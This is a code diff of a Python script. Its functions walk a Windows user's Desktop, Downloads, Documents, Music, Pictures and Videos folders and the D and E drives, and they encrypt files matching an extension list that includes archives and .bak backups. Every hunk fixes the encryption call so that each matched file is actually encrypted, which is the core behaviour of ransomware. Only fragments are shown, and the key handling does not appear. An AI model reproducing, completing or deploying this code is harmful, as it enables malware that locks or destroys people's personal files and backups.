@@ -229,9 +229,9 @@ def C_drive_desktop():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                                encrypt_file(file_input, key)
+                               encrypt_file(l, key)
             else:
-                encrypt_file(file_input, key)
+                shit = 12
 
 
             lol = 'Desktop Folder : '
@@ -300,9 +300,9 @@ def C_drive_downloads():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                                encrypt_file(file_input, key)
+                               encrypt_file(l, key)
             else:
-                encrypt_file(file_input, key)
+                shit = 12
 
 
             lol = 'Downloads Folder : '
@@ -371,9 +371,9 @@ def C_drive_documents():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                                encrypt_file(file_input, key)
+                               encrypt_file(l, key)
             else:
-                encrypt_file(file_input, key)
+                shit = 12
 
 
             lol = 'Documents Folder : '
@@ -442,9 +442,9 @@ def C_drive_music():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                                encrypt_file(file_input, key)
+                               encrypt_file(l, key)
             else:
-                encrypt_file(file_input, key)
+                shit = 12
 
 
             lol = 'Music Folder : '
@@ -513,9 +513,9 @@ def C_drive_pictures():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                                encrypt_file(file_input, key)
+                               encrypt_file(l, key)
             else:
-                encrypt_file(file_input, key)
+                shit = 12
 
 
             lol = 'Pictures Folder : '
@@ -584,9 +584,9 @@ def C_drive_videos():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                                encrypt_file(file_input, key)
+                               encrypt_file(l, key)
             else:
-                encrypt_file(file_input, key)
+                shit = 12
 
 
             lol = 'Videos Folder : '
@@ -656,9 +656,9 @@ def D_drive():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                                encrypt_file(file_input, key)
+                               encrypt_file(l, key)
             else:
-                encrypt_file(file_input, key)
+                shit = 12
 
 
             lol = 'D Drive : '
@@ -727,9 +727,9 @@ def E_drive():
                                 '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
                             )
                             if l.endswith(EXTENSIONS):
-                                encrypt_file(file_input, key)
+                               encrypt_file(l, key)
             else:
-                encrypt_file(file_input, key)
+                shit = 12
 
 
             lol = 'E Drive : '
